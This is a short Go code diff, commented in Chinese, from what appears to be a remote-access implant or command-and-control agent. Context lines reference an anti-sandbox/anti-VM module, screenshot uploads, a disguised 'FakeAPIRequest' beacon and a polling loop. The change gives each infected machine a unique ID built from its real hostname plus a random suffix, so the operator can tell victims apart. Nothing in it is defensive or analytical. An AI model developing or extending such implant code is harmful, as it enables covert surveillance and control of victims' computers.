@@ -12,6 +12,7 @@ import (
 	"image/png"
 	"io"
 	"net/http"
+	"math/big"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -43,6 +44,27 @@ type FakeAPIRequest struct {
 	Hostname string `json:"hostname"`
 	Token    string `json:"token"`
 	Status   string `json:"status"`
+}
+
+// --- [新增] 获取唯一主机名 ---
+// 格式: 真实主机名-随机后缀 (例如: DESKTOP-ADMIN-a1b2)
+func getHostname() string {
+	// 1. 获取系统真实主机名
+	name, err := os.Hostname()
+	if err != nil {
+		name = "UNKNOWN"
+	}
+	
+	// 2. 生成 4 位随机后缀 (防止克隆机重名)
+	// 使用 crypto/rand 生成真随机数
+	const letters = "0123456789abcdef"
+	suffix := make([]byte, 4)
+	for i := 0; i < 4; i++ {
+		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
+		suffix[i] = letters[num.Int64()]
+	}
+
+	return fmt.Sprintf("%s-%s", name, string(suffix))
 }
 
 // --- 模块 1: 反沙箱/反虚拟机 ---
@@ -171,7 +193,9 @@ func main() {
 	client := &http.Client{Timeout: 30 * time.Second, Transport: tr} // 截图上传需要时间，增加超时
 
 	// 这里的 Hostname 后面加上 -v2 方便你区分新版 Agent
-	hostname := "agent-win11-v2" 
+	hostname := getHostname()
+
+	fmt.Printf("[*] Agent ID: %s\n", hostname)
 
 	for {
 		reqData := FakeAPIRequest{Hostname: hostname, Status: "idle"}
